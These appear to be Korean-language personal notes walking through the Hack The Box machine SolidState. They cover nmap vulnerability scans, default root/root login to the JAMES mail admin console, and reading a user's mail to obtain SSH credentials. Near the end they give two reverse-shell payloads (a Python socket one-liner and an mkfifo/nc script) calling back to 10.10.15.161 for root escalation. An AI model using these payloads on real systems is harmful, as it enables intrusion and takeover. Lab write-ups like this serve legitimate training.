
## Nmap

```bash
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.100.149 -oN 10.129.100.149.log
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 16:30 KST
Stats: 0:03:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.93% done; ETC: 16:33 (0:00:00 remaining)
Nmap scan report for 10.129.100.149
Host is up (0.26s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn''t establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


```bash
nmap -sV -A --script vuln 192.168.122.148
```
```bash
Nmap scan report for 10.129.100.149
Host is up (0.25s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4p1: 
|       DF059135-2CF5-5441-8F22-E6EF1DEE5F6E    10.0    https://vulners.com/gitee/DF059135-2CF5-5441-8F22-E6EF1DEE5F6E     *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807     *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23     *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623     *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC     *EXPLOIT*
|       6192C35D-F78B-5C0A-AB8D-9826A79A5320    9.8     https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320     *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0     *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587     *EXPLOIT*
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0     *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F     *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    7.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3     *EXPLOIT*

25/tcp  open  smtp?
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
| http-enum: 
|   /README.txt: Interesting, a readme.
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.25 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6  9.8     https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|       HTTPD:9AD76A782F4E66676719E36B64777A7A  9.8     https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
|       HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9  9.8     https://vulners.com/httpd/HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9
|       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|       HTTPD:1F84410918227CC81FA7C000C4F999A3  9.8     https://vulners.com/httpd/HTTPD:1F84410918227CC81FA7C000C4F999A3
|       HTTPD:156974A46CA46AF26CC4140D00F7EB10  9.8     https://vulners.com/httpd/HTTPD:156974A46CA46AF26CC4140D00F7EB10
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52     *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
|       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-7679   9.8     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   9.8     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   9.8     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-41640 9.8     https://vulners.com/cnvd/CNVD-2022-41640
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       B6297446-2DDD-52BA-B508-29A748A5D2CC    9.8     https://vulners.com/githubexploit/B6297446-2DDD-52BA-B508-29A748A5D2CC     *EXPLOIT*
|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C     *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9     *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B     *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       1337DAY-ID-38427        9.8     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       0DB60346-03B6-5FEE-93D7-FF5757D225AA    9.8     https://vulners.com/gitee/0DB60346-03B6-5FEE-93D7-FF5757D225AA     *EXPLOIT*
|       HTTPD:D868A1E68FB46E2CF5486281DCDB59CF  9.1     https://vulners.com/httpd/HTTPD:D868A1E68FB46E2CF5486281DCDB59CF
|       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|       HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF  9.1     https://vulners.com/httpd/HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF
|       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F     *EXPLOIT*
|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7     *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89     *EXPLOIT*
|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45     *EXPLOIT*
|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CVE-2019-10082  9.1     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   9.1     https://vulners.com/cve/CVE-2017-9788
|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D     *EXPLOIT*
|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A     *EXPLOIT*
|       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    9.0     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8     *EXPLOIT*
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C     *EXPLOIT*
|       9D9B3F4D-6B5C-5377-BE39-F1C432C9E457    9.0     https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457     *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2     *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2     *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F     *EXPLOIT*
|       D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB    8.8     https://vulners.com/githubexploit/D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB     *EXPLOIT*
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91     *EXPLOIT*
|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
|       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
|       CNVD-2021-102387        8.2     https://vulners.com/cnvd/CNVD-2021-102387
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38     *EXPLOIT*
|       HTTPD:B63E69E936F944F114293D6F4AB8D4D6  8.1     https://vulners.com/httpd/HTTPD:B63E69E936F944F114293D6F4AB8D4D6
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       CVE-2017-15715  8.1     https://vulners.com/cve/CVE-2017-15715
|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1     *EXPLOIT*
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5     *EXPLOIT*
|       HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65  7.8     https://vulners.com/httpd/HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65
|       HTTPD:109158785130C454EF1D1CDDD4417560  7.8     https://vulners.com/httpd/HTTPD:109158785130C454EF1D1CDDD4417560
|       EDB-ID:46676    7.8     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041     *EXPLOIT*
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       CVE-2019-0211   7.8     https://vulners.com/cve/CVE-2019-0211
|       CNVD-2019-08946 7.8     https://vulners.com/cnvd/CNVD-2019-08946
|       706A08EF-16F2-59B5-B98E-EB8B83215AB1    7.8     https://vulners.com/gitee/706A08EF-16F2-59B5-B98E-EB8B83215AB1     *EXPLOIT*
|       PACKETSTORM:212872      7.5     https://vulners.com/packetstorm/PACKETSTORM:212872      *EXPLOIT*
|       PACKETSTORM:211124      7.5     https://vulners.com/packetstorm/PACKETSTORM:211124      *EXPLOIT*
|       PACKETSTORM:181038      7.5     https://vulners.com/packetstorm/PACKETSTORM:181038      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED- 7.5     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-     *EXPLOIT*
|       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|       HTTPD:F42C3F30D72C7F0EAB800B29D17B0701  7.5     https://vulners.com/httpd/HTTPD:F42C3F30D72C7F0EAB800B29D17B0701
|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|       HTTPD:D9B9375C40939357C5F47F1B3F64F0A1  7.5     https://vulners.com/httpd/HTTPD:D9B9375C40939357C5F47F1B3F64F0A1
|       HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43  7.5     https://vulners.com/httpd/HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43
|       HTTPD:CEEECD1BF3428B58C39137059390E4A1  7.5     https://vulners.com/httpd/HTTPD:CEEECD1BF3428B58C39137059390E4A1
|       HTTPD:C7D6319965E27EC08FB443D1FD67603B  7.5     https://vulners.com/httpd/HTTPD:C7D6319965E27EC08FB443D1FD67603B
|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|       HTTPD:975FD708E753E143E7DFFC23510F802E  7.5     https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
|       HTTPD:708DA551D11D790335A6621D3875C0F4  7.5     https://vulners.com/httpd/HTTPD:708DA551D11D790335A6621D3875C0F4
|       HTTPD:63F2722DB00DBB3F59C40B40F32363B3  7.5     https://vulners.com/httpd/HTTPD:63F2722DB00DBB3F59C40B40F32363B3
|       HTTPD:6236A32987BAE49DFBF020477B1278DD  7.5     https://vulners.com/httpd/HTTPD:6236A32987BAE49DFBF020477B1278DD
|       HTTPD:60420623F2A716909480F87DB74EE9D7  7.5     https://vulners.com/httpd/HTTPD:60420623F2A716909480F87DB74EE9D7
|       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|       HTTPD:5A19AF8A0AFEFB7E187025740EEC094C  7.5     https://vulners.com/httpd/HTTPD:5A19AF8A0AFEFB7E187025740EEC094C
|       HTTPD:05E6BF2AD317E3658D2938931207AA66  7.5     https://vulners.com/httpd/HTTPD:05E6BF2AD317E3658D2938931207AA66
|       EDB-ID:52426    7.5     https://vulners.com/exploitdb/EDB-ID:52426      *EXPLOIT*
|       EDB-ID:42745    7.5     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F     *EXPLOIT*
|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A     *EXPLOIT*
|       D228B59B-465A-509D-A681-012DB9348698    7.5     https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698     *EXPLOIT*
|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477

|     http://10.129.100.149:80/assets/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/ie/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/ie/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/ie/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/ie/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://10.129.100.149:80/assets/js/?C=M%3BO%3DA%27%20OR%20sqlspider
|_    http://10.129.100.149:80/assets/js/?C=D%3BO%3DA%27%20OR%20sqlspider
110/tcp open  pop3?
119/tcp open  nntp?
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   251.98 ms 10.10.14.1
2   252.52 ms 10.129.100.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 704.25 seconds


```

JAMES 접근 확인 root/root
![[Pasted image 20260128175247.png]]

setpassword mindy password

![[Pasted image 20260128175616.png]]


```bash
┌──(kali㉿kali)-[~/HTB/SolidState]
└─$ telnet 10.129.100.149 110 
Trying 10.129.100.149...
Connected to 10.129.100.149.
Escape character is '^]'.
mindy
password
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
-ERR
-ERR

USER mindy
+OK
PASS password
+OK Welcome mindy
LSIT
-ERR
LIST
+OK 2 1945
1 1109
2 836
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

이전에 발견한 자격증명으로 user_flag 획득
![[Pasted image 20260130143208.png]]

모든 환경변수 확인
![[Pasted image 20260130154502.png]]


```bash
ssh midy@10.129.102.110 -t "bash --noprofile"
```


수정가능한 파일 발견
![[Pasted image 20260130162717.png]]


수정 가능한 파일이지만 root 권한 실행

![[Pasted image 20260130162920.png]]


echo 명령어로 수정 >>> 실패
```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.161",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")" > tmp.py
```

```python
import os
import sys
try:
	os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.161 4444>/tmp/f')
except:
	sys.exit()
```

![[Pasted image 20260130165910.png]]


root flag 획득
![[Pasted image 20260130170419.png]]





